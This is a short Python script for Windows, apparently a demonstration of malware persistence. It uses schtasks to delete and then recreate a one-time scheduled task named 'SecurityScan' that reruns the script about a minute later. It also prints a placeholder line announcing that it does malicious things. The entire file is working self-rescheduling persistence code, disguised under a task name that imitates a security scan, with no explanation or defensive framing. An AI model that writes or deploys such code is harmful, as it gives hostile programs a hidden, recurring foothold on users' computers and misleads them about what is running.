import os, random
from datetime import datetime,timedelta

if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")

filedir = os.path.join(os.getcwd(),"sched.py")

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))
dt = datetime.now() + timedelta(minutes=interval)
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)
os.system('schtasks /create /tn SecurityScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
input()